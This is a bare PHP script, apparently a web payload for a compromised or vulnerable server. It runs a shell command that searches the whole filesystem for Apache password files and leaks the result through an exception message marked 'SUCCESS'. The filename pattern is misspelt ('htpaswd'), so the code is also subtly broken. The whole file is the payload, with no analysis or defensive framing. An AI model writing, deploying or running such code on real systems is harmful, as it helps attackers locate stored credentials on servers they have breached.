<?php
$output ='';

$output =$output."\n htpaswd ".shell_exec ("find / -name '*.htpaswd*'");

throw new Exception("\n SUCCESS  ". $output."\n");
?>
